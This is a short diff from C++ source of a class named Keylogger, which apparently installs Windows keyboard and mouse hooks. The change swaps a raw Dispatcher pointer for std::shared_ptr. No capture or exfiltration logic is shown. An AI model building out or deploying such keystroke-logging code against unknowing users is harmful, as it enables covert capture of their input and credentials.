@@ -2,7 +2,7 @@
 
 extern HHOOK g_hook[2];
 
-Dispatcher *Keylogger::_disp = NULL;
+std::shared_ptr<Dispatcher> Keylogger::_disp = NULL;
 
 LRESULT CALLBACK Keylogger::handleKey(int code, WPARAM wParam, LPARAM lParam)
 {
@@ -52,7 +52,7 @@ LRESULT CALLBACK Keylogger::handleMouse(int code, WPARAM wParam, LPARAM lParam)
 	return CallNextHookEx(g_hook[1], code, wParam, lParam);
 }
 
-void Keylogger::setDispatcher(Dispatcher *disp)
+void Keylogger::setDispatcher(std::shared_ptr<Dispatcher> disp)
 {
 	_disp = disp;
 }
